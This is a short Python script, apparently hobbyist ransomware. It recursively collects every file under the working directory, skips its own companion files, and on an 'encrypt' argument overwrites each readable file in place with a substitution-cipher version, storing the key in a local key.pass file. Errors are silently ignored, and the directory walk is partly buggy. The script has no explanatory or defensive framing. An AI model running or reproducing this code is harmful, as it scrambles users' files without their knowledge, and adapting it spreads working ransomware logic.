"""<version>release 1.0</version>"""
import os
import random

files = []

if not "args" in locals():
    args = []

def appenddir(dir):
	print(f"appending dir: {dir}")
	dirfiles = []
	for file in os.listdir(dir):
		if (file == "ware.py" or file ==  "key.pass" or file == "antiware.py" or file == "console.py") and dir == os.getcwd():
			print(f"skipped file: {file}")
			continue
		if os.path.isfile(file):
			files.append(os.path.join(dir, file))
			dirfiles.append(file)
		if os.path.isdir(file):
			print(f"folder detected: {file}")
			appenddir(os.path.join(dir, file))
	print(f"files found in {dir}: {str(dirfiles)}")
appenddir(os.getcwd())

print(files)
def encrypt(args):
	alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-=_+[]{}\\|\n"

	if len(args) >= 2 and len(args[1].replace("\\n", "\n")) >= len(alphabet) - 1:
		key = args[1].replace("\\n", "\n")
		lettershad = []
		for k in key:
			if k in lettershad:
				print("\033[91mkey cant have duplicate letters" + k)
				return
			else:
				lettershad.append(k)
	elif len(args) >= 2:
		print("\033[91mkey to short")
		return
	else:
		key = ''.join(random.sample(alphabet, len(alphabet)))

	with open("key.pass", "w") as thekey:
		thekey.write(key)
	with open("key.pass", "r") as thekey:
		key = thekey.read()
	encalphabet = ""
	index = 0
	for letter in alphabet:
		encalphabet += key[index]
		index += 1
	print(encalphabet)

	finishedfiles = []

	for file in files:
		try:
			with open(file, "r") as thefile:
				contents = thefile.read()
				contents_encrypted = ""
				for encletter in contents:
					index = 0
					for letter in alphabet:
						index += 1
						if encletter == letter:
							encletter = key[index - 1]
							break
					contents_encrypted += encletter
			with open(file, "w") as thefile:
				thefile.write(contents_encrypted)
			finishedfiles.append(file)
		except:
			a = ""

	print(f"encrypting finished for {str(finishedfiles)}")
if len(args) >= 1 and args[0] == "encrypt":
	encrypt(args)